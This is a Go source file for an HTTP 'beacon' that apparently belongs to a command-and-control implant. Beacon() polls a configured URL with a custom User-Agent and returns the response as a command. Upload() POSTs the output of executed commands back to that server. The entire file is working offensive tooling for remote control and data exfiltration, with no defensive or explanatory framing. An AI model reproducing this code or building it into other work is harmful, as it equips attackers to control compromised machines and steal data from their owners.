package beacon

import (
	"net/http"	
	"io/ioutil"
	"log"
	"bytes"
	"strings"
)

// Define an HTTP Authentication beacon.
type HttpAuthBeacon struct {
	url   string
	agent string
}

// sends beacon using http get and checks for command in response
func (h *HttpAuthBeacon) Beacon() string {
	if strings.Contains(h.url, "https") {
		log.Printf("HTTPS GET beacon to %s", h.url)
	} else {
		log.Printf("HTTP GET beacon to %s", h.url)
	}
	
	client := httpClient()
	req, err := http.NewRequest("GET", h.url, nil)
	if err != nil {
		return ""
	}

	req.Header.Set("User-Agent", h.agent)
	resp, err := client.Do(req)

	if err != nil {
		return ""
	}

	bodyString := ""
	if resp.StatusCode == http.StatusOK {
	    bodyBytes, err := ioutil.ReadAll(resp.Body)
	    if err != nil {
	        log.Fatal(err)
	    }
	    bodyString = string(bodyBytes)
	}

	return bodyString
}

// upload command output using HTTP POST 
func (h *HttpAuthBeacon) Upload(data string) {
	if strings.Contains(h.url, "https") {
		log.Printf("HTTPS POST beacon to %s", h.url)
	} else {
		log.Printf("HTTP POST beacon to %s", h.url)
	}
	client := httpClient()
	req, err := http.NewRequest("POST", h.url, bytes.NewBuffer([]byte(data))) 
	if err != nil {
		return
	}

	req.Header.Set("User-Agent", h.agent)

	resp, err := client.Do(req)
	if err != nil {
		return
	}

	defer resp.Body.Close()
}